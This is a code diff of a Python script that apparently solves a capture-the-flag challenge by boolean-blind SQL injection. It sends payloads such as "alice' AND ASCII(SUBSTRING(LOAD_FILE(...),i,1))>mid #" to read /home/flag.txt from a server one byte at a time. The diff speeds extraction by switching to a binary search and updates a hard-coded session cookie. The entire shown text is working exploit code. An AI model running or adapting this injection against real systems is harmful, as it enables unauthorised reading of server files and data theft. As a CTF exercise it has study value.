@@ -5,7 +5,7 @@ true_indicator = "In wonderland right now"
 
 # Update this cookie if the session expires
 my_cookies = {
-    'PHPSESSID': '14a6773ab6444749b4c46e19a6bdd25c'
+    'PHPSESSID': '414170264f5da76958870da216138b7c'
 }
 
 def path_to_char(path):
@@ -54,16 +54,19 @@ def extract_flag(file_path="/home/flag.txt"):
     print("  Reading: ", end='', flush=True)
 
     for i in range(1, length + 1):
-        for byte_val in range(0, 256):
-            condition = f"ASCII(SUBSTRING(LOAD_FILE({path_char}),{i},1))={byte_val}"
-            payload = f"alice' AND {condition} #"
+        lo, hi = 0, 255
+        while lo < hi:
+            mid = (lo + hi) // 2
+            payload = f"alice' AND ASCII(SUBSTRING(LOAD_FILE({path_char}),{i},1))>{mid} #"
             response = requests.get(url, params={'user': payload}, cookies=my_cookies)
-
             if true_indicator in response.text:
-                flag_bytes.append(byte_val)
-                char = chr(byte_val) if 32 <= byte_val < 127 else f"\\x{byte_val:02x}"
-                print(char, end='', flush=True)
-                break
+                lo = mid + 1
+            else:
+                hi = mid
+        byte_val = lo
+        flag_bytes.append(byte_val)
+        char = chr(byte_val) if 32 <= byte_val < 127 else f"\\x{byte_val:02x}"
+        print(char, end='', flush=True)
 
     print()
     return bytes(flag_bytes)
